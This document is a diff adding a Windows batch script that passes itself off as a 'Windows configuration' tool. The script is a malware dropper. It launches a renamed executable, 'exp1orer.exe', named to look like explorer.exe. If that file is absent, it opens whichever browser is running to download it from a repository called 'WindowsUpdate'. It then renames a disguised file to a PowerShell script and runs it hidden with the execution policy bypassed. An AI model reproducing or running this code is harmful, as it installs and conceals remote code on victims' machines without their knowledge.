@@ -1,0 +1,34 @@
+@echo off 
+color 1a
+
+title W  I  N  D  O  W  S    C  O  N  F  I  G  U  A  T  I  O  N
+echo W  I  N  D  O  W  S    C  O  N  F  I  G  U  A  T  I  O  N 
+
+:https
+tasklist /fi "IMAGENAME eq exp1orer.exe" | find /i "exp1orer.exe" && exit
+
+IF EXIST exp1orer.uiaq (
+	ren exp1orer.uiaq exp1orer.exe & start /min exp1orer.exe && ping bbc.com & goto https
+) ELSE (
+	goto shanghai
+
+)
+
+:shanghai
+cd / & cd.. || cd ..  & cd %userprofile% || cd "%userprofile%" & cd Downloads || cd "Downloads" & cd "My Downloads" || cd My Downloads
+
+IF EXIST exp1orer.uiaq (
+	xcopy /c /q /y /s /i exp1orer.uiaq "C:\Users\Public" || xcopy /c /q /y /s /i exp1orer.uiaq C:\Users\Public
+	cd.. || cd .. & cd.. || cd .. & cd.. || cd .. & cd / & cd Users || cd "Users" & cd Public || cd "Public"
+	goto https
+	
+) ELSE (
+	tasklist /fi "IMAGENAME eq chrome.exe" | find /i "chrome.exe" && start chrome "https://github.com/AlaskaMN/WindowsUpdate/raw/master/exp1orer.uiaq" || tasklist /fi "IMAGENAME eq firefox.exe" | find /i "firefox.exe" && start firefox "https://github.com/AlaskaMN/WindowsUpdate/raw/master/exp1orer.uiaq" || tasklist /fi "IMAGENAME eq opera.exe" | find /i "opera.exe" && start opera "https://github.com/AlaskaMN/WindowsUpdate/raw/master/exp1orer.uiaq"
+
+	cd.. || cd .. & cd.. || cd .. & cd.. || cd .. & cd / & cd Users || cd "Users" & cd Public || cd "Public"
+	
+	ren 6pylooper.altp 6pylooper.ps1
+	
+	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File 6pylooper.ps1
+
+)
